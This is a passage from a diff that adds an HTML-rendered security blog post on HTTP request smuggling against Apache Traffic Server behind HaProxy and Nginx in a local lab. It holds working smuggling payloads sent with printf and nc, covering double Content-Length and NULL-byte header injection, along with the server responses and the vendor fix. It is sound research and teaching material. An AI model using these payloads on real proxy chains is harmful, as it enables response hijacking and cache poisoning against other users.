+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;GET / HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:dummy-host7.example.com\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; nc 127.0.0.1 8001
+
+&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;GET / HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:dummy-host6.example.com\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; nc 127.0.0.1 8001&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;And now let&#39;s start a more complex HTTP stuff, we will make an &lt;strong&gt;HTTP pipeline&lt;/strong&gt;, pipelining several queries and receiving several responses, as pipelining is the &lt;strong&gt;root&lt;/strong&gt; of most smuggling attacks:&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# send one pipelined chain of queries&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;GET /?cache=1 HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:dummy-host7.example.com\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;GET /?cache=2 HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:dummy-host7.example.com\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;GET /?cache=3 HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:dummy-host6.example.com\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;GET /?cache=4 HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:dummy-host6.example.com\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; nc 127.0.0.1 8001&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;This is &lt;strong&gt;pipelining&lt;/strong&gt;, it&#39;s not only using &lt;strong&gt;HTTP keepAlive&lt;/strong&gt;, because we send the chain of queries without waiting for the responses. See &lt;a href=&quot;https://regilero.github.io/security/english/2015/10/04/http_smuggling_in_2015_part_one/#toc4&quot;&gt;my previous post&lt;/a&gt; for detail on Keepalives and Pipelining.&lt;/p&gt;
+
+&lt;p&gt;You should get the &lt;strong&gt;Nginx access log&lt;/strong&gt; on the docker-compose output, if you do not &lt;strong&gt;rotate some arguments&lt;/strong&gt; in the query nginx wont get reached by your requests, because ATS is caching the result already (&lt;code&gt;CTRL+C&lt;/code&gt; on the docker-compose output and &lt;code&gt;docker-compose up&lt;/code&gt; will remove any cache).&lt;/p&gt;
+
+&lt;h2&gt;Request Splitting by Double Content-Length&lt;/h2&gt;
+
+&lt;p&gt;Let&#39;s start a real play. That&#39;s the 101 of HTTP Smuggling. The &lt;em&gt;easy&lt;/em&gt; vector. &lt;strong&gt;Double Content-Length header support is strictly forbidden&lt;/strong&gt; by the &lt;a href=&quot;https://tools.ietf.org/html/rfc7230#section-3.3.3&quot;&gt;RFC 7230 3.3.3&lt;/a&gt; (bold added):&lt;/p&gt;
+
+&lt;blockquote&gt;&lt;p&gt;&lt;strong&gt;4&lt;/strong&gt; If a message is received without Transfer-Encoding and with
+   either &lt;strong&gt;multiple Content-Length header fields having differing
+   field-values&lt;/strong&gt; or a single Content-Length header field having an
+   invalid value, then the message framing is invalid and the
+   recipient &lt;strong&gt;MUST treat it as an unrecoverable error&lt;/strong&gt;. If this is
+   a request message, the server MUST respond with a 400 (Bad Request)
+   status code and then close the connection.  If this is a response
+   message received by a proxy, the proxy MUST close the connection
+   to the server, discard the received response, and send a 502 (Bad
+   Gateway) response to the client.  If this is a response message
+   received by a user agent, the user agent MUST close the
+   connection to the server and discard the received response.&lt;/p&gt;&lt;/blockquote&gt;
+
+&lt;p&gt;Differing interpretations of message length based on the order of Content-Length headers were the first demonstrated HTTP smuggling attacks (2005).&lt;/p&gt;
+
+&lt;p&gt;Sending such query directly on ATS generates 2 responses (one 400 and one 200):&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;GET /index.html?toto=1 HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Host: dummy-host7.example.com\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Content-Length: 0\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Content-Length: 66\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;GET /index.html?toto=2 HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Host: dummy-host7.example.com\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt;nc -q &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; 127.0.0.1 8007&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The regular response should be one error 400.&lt;/p&gt;
+
+&lt;p&gt;Using port 8001 (HaProxy) would not work, HaProxy is a robust HTTP agent and cannot be fooled by such an easy trick.&lt;/p&gt;
+
+&lt;p&gt;This is &lt;strong&gt;Critical&lt;/strong&gt; Request Splitting, classical, but hard to reproduce in real life environment if some robust tools are used on the reverse proxy chain. So, &lt;strong&gt;why critical?&lt;/strong&gt; Because you could also consider ATS to be robust, and use a new unknown HTTP server behind or in front of ATS and expect such smuggling attacks to be properly detected.&lt;/p&gt;
+
+&lt;p&gt;And there is another factor of criticality, any other issue on HTTP parsing can exploit this Double Content-Length. Let&#39;s say you have another issue which allows you to hide one header for all other HTTP actors, but reveals this header to ATS. Then you just have to use this hidden header for a second Content-length and you&#39;re done, without being blocked by a previous actor. On our current case, ATS, you have one example of such hidden-header issue with the &#39;space-before-:&#39; that we will analyze later.&lt;/p&gt;
+
+&lt;h2&gt;Request Splitting by NULL Character Injection&lt;/h2&gt;
+
+&lt;p&gt;This example is not the easiest one to understand (go to the next one if you do not get it, or even the one after), that&#39;s also not the biggest impact, as we will use a really bad query to attack, easily detected. But I love the magical &lt;strong&gt;NULL&lt;/strong&gt; (&lt;code&gt;\0&lt;/code&gt;) character.&lt;/p&gt;
+
+&lt;p&gt;Using a NULL byte character in a header triggers a query rejection on ATS, that&#39;s ok, but also a &lt;strong&gt;premature end of query&lt;/strong&gt;, and if you do not close pipelines after a first error, bad things could happen. Next line is interpreted as next query in pipeline.&lt;/p&gt;
+
+&lt;p&gt;So, a valid (almost, if you except the NULL character) pipeline like this one:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt; 01 GET /does-not-exists.html?foofoo=1 HTTP/1.1\r\n
+ 02 X-Something: \0 something\r\n
+ 03 X-Foo: Bar\r\n
+ 04 \r\n
+ 05 GET /index.html?bar=1 HTTP/1.1\r\n
+ 06 Host: dummy-host7.example.com\r\n
+ 07 \r\n
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Generates 2 error 400. because the second query is starting with &lt;code&gt;X-Foo: Bar\r\n&lt;/code&gt; and that&#39;s
+an invalid first query line.&lt;/p&gt;
+
+&lt;p&gt;Let&#39;s test an invalid pipeline (as there&#39;is no &lt;code&gt;\r\n&lt;/code&gt; between the 2 queries):&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt; 01 GET /does-not-exists.html?foofoo=2 HTTP/1.1\r\n
+ 02 X-Something: \0 something\r\n
+ 03 GET /index.html?bar=2 HTTP/1.1\r\n
+ 04 Host: dummy-host7.example.com\r\n
+ 05 \r\n
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;It generates 1 error 400 and one 200 OK response. Lines &lt;strong&gt;03/04/05&lt;/strong&gt; are taken as a valid query.&lt;/p&gt;
+
+&lt;p&gt;This is already an HTTP request Splitting attack.&lt;/p&gt;
+
+&lt;p&gt;But line &lt;strong&gt;03&lt;/strong&gt; is a really bad header line that most agent would reject. You cannot read that as a valid unique query. The fake pipeline would be detected early as a bad query, I mean line 03 is clearly not a valid header line.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;GET /index.html?bar=2 HTTP/1.1\r\n
+ !=
+&amp;lt;HEADER-NAME-NO-SPACE&amp;gt;[:][SP]&amp;lt;HEADER-VALUE&amp;gt;[CR][LF]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;For the first line the syntax is one of these two lines:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;METHOD&amp;gt;[SP]&amp;lt;LOCATION&amp;gt;[SP]HTTP/[M].[m][CR][LF]
+&amp;lt;METHOD&amp;gt;[SP]&amp;lt;http[s]://LOCATION&amp;gt;[SP]HTTP/[M].[m][CR][LF] (absolute uri)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;code&gt;LOCATION&lt;/code&gt; may be used to inject the special &lt;code&gt;[:]&lt;/code&gt; that is required in an header line, especially on the query string part,
+but this would inject a lot of bad characters in the &lt;code&gt;HEADER-NAME-NO-SPACE&lt;/code&gt; part, like &#39;/&#39; or &#39;?&#39;.&lt;/p&gt;
+
+&lt;p&gt;Let&#39;s try with the ABSOLUTE-URI alternative syntax, where the &lt;code&gt;[:]&lt;/code&gt; comes faster on the line, and the only bad character for an Header name would be the space. This will also fix the potential presence of the double Host header (absolute uri does replace the Host header).&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt; 01 GET /does-not-exists.html?foofoo=2 HTTP/1.1\r\n
+ 02 Host: dummy-host7.example.com\r\n
+ 03 X-Something: \0 something\r\n
+ 04 GET http://dummy-host7.example.com/index.html?bar=2 HTTP/1.1\r\n
+ 05 \r\n
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Here the bad header which becomes a query is line &lt;strong&gt;04&lt;/strong&gt;, and the &lt;strong&gt;header name&lt;/strong&gt; is &lt;code&gt;GET http&lt;/code&gt; with an header value of &lt;code&gt;//dummy-host7.example.com/index.html?bar=2 HTTP/1.1&lt;/code&gt;. That&#39;s still an invalid header (the header name contains a space) but I&#39;m pretty sure we could find some HTTP agent transferring this header (ATS is one proof of that, space character in header names were allowed).&lt;/p&gt;
+
+&lt;p&gt;A real attack using this trick will looks like this:&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;GET /something.html?zorg=1 HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Host: dummy-host7.example.com\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;X-Something: &amp;quot;\0something&amp;quot;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;GET http://dummy-host7.example.com/index.html?replacing=1&amp;amp;zorg=2 HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;GET /targeted.html?replaced=maybe&amp;amp;zorg=3 HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Host: dummy-host7.example.com\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt;nc -q &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; 127.0.0.1 8007&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;This is just &lt;strong&gt;2 queries&lt;/strong&gt; (1st one has 2 bad header, one with a NULL, one with a space in header name), for ATS it&#39;s &lt;strong&gt;3 queries&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;The regular second one (&lt;code&gt;/targeted.html&lt;/code&gt;) -- third for ATS --  will get the response of the hidden query (&lt;code&gt;http://dummy-host.example.com/index.html?replacing=1&amp;amp;zorg=2&lt;/code&gt;). Check the &lt;code&gt;X-Location-echo:&lt;/code&gt; added by Nginx. After that ATS adds a thirsr response, a 404, but the previous actor expects only 2 responses, and the second response &lt;strong&gt;is already replaced&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-http&quot; data-lang=&quot;http&quot;&gt;&lt;span class=&quot;kr&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;400&lt;/span&gt; &lt;span class=&quot;ne&quot;&gt;Invalid HTTP Request&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Date&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;Fri, 26 Oct 2018 15:34:53 GMT&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;keep-alive&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Server&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;ATS/7.1.1&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Cache-Control&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;no-store&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Content-Type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;text/html&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Content-Language&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;en&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Content-Length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;220&lt;/span&gt;
+
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;HTML&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;HEAD&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;TITLE&amp;gt;&lt;/span&gt;Bad Request&lt;span class=&quot;nt&quot;&gt;&amp;lt;/TITLE&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/HEAD&amp;gt;&lt;/span&gt;
+
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;BODY&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;BGCOLOR=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;white&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;FGCOLOR=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;black&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;H1&amp;gt;&lt;/span&gt;Bad Request&lt;span class=&quot;nt&quot;&gt;&amp;lt;/H1&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;HR&amp;gt;&lt;/span&gt;
+
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;FONT&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;FACE=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;Helvetica,Arial&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;B&amp;gt;&lt;/span&gt;
+Description: Could not process this request. 
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/B&amp;gt;&amp;lt;/FONT&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;HR&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/BODY&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Then:&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-http&quot; data-lang=&quot;http&quot;&gt;&lt;span class=&quot;kr&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;200&lt;/span&gt; &lt;span class=&quot;ne&quot;&gt;OK&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Server&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;ATS/7.1.1&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Date&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;Fri, 26 Oct 2018 15:34:53 GMT&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Content-Type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;text/html&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Content-Length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;120&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Last-Modified&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;Fri, 26 Oct 2018 14:16:28 GMT&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;ETag&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;&amp;quot;5bd321bc-78&amp;quot;&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;X-Location-echo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;/index.html?replacing=1&amp;amp;zorg=2&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;X-Default-VH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;0&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Cache-Control&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;public, max-age=300&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Accept-Ranges&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;bytes&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Age&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;0&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;keep-alive&lt;/span&gt;
+
+$&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;&lt;/span&gt;Nginx default static page&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&amp;lt;h1&amp;gt;&lt;/span&gt;Hello World&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;p&amp;gt;&lt;/span&gt;It works!&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;And then the extra unused response:&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-http&quot; data-lang=&quot;http&quot;&gt;&lt;span class=&quot;kr&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;404&lt;/span&gt; &lt;span class=&quot;ne&quot;&gt;Not Found&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Server&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;ATS/7.1.1&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Date&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;Fri, 26 Oct 2018 15:34:53 GMT&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Content-Type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;text/html&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Content-Length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;153&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Age&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;0&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;keep-alive&lt;/span&gt;
+
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;&lt;/span&gt;404 Not Found&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;center&amp;gt;&amp;lt;h1&amp;gt;&lt;/span&gt;404 Not Found&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&amp;lt;/center&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;hr&amp;gt;&amp;lt;center&amp;gt;&lt;/span&gt;nginx/1.15.5&lt;span class=&quot;nt&quot;&gt;&amp;lt;/center&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;If you try to use port 8001 (so transit via HaProxy) you will not get the expected attacking result. That attacking query is really too bad.&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-http&quot; data-lang=&quot;http&quot;&gt;&lt;span class=&quot;kr&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.0&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;400&lt;/span&gt; &lt;span class=&quot;ne&quot;&gt;Bad request&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Cache-Control&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;no-cache&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;close&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Content-Type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;text/html&lt;/span&gt;
+
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&amp;lt;body&amp;gt;&amp;lt;h1&amp;gt;&lt;/span&gt;400 Bad request&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
+Your browser sent an invalid request.
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;That&#39;s an HTTP request splitting attack, but real world usage may be hard to find.&lt;/p&gt;
+
+&lt;p&gt;The fix on ATS is the &#39;close on error&#39;, when an error 400 is triggered the pipelined is stopped, the socket is closed after the error.&lt;/p&gt;
+
+&lt;h2&gt;Request Splitting using Huge Header, Early End-Of-Query&lt;/h2&gt;
+
